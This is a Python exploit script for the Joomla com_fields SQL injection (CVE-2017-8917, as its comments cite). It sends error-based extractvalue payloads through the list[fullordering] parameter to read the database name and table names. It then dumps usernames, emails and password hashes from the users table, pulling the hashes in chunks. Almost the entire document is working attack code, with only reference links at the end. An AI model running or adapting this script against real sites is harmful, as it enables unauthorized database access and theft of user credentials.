import requests
import urllib.request

host = "some_host"
base_url = f"http://{host}"
params = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=extractvalue(0x0a,concat(0x0a,({})))"

def get_tables():
    tables = []
    row = 0
    while True:
        payload = urllib.request.pathname2url(f"select table_name from INFORMATION_SCHEMA.TABLES limit {row},1")
        params_query = params.format(payload)
        response = requests.get(base_url + params_query)
        if not "XPATH syntax error: &#039;".encode() in response.content:
            return tables
        res = response.content.split(b"&#039;")[1][1:]
        row += 1
        tables.append(res.decode())

def get_database_name():
    payload = urllib.request.pathname2url(f"select database() limit 0,1")
    params_query = params.format(payload)
    response = requests.get(base_url + params_query)
    if not "XPATH syntax error: &#039;".encode() in response.content:
        return
    res = response.content.split(b"&#039;")[1][1:]
    return res.decode()

def get_users():
    users = []
    row = 0
    while True:
        payload = urllib.request.pathname2url(f"select username from #__users limit {row},1")
        params_query = params.format(payload)
        response = requests.get(base_url + params_query)
        if not "XPATH syntax error: &#039;".encode() in response.content:
            return users
        username = response.content.split(b"&#039;")[1][1:].decode()

        payload = urllib.request.pathname2url(f"select email from #__users limit {row},1")
        params_query = params.format(payload)
        response = requests.get(base_url + params_query)
        if not "XPATH syntax error: &#039;".encode() in response.content:
            return users
        email = response.content.split(b"&#039;")[1][1:].decode()

        password = ""
        start_index = 1
        while True:
            payload = urllib.request.pathname2url(f"select substring(password,{start_index},10) from #__users limit {row},1")
            params_query = params.format(payload)
            response = requests.get(base_url + params_query)
            if not "XPATH syntax error: &#039;".encode() in response.content:
                break
            res = response.content.split(b"&#039;")[1][1:].decode()
            if res == "":
                break
            password += res
            start_index += 10

        row += 1
        users.append([username, email, password])

print(get_users())

# Inspiration + more information
#https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MSSQL%20-%20Error%20Based%20SQLi
#https://github.com/SiopySh/CVE-2017-8917/blob/main/cve20178917.py
#https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1
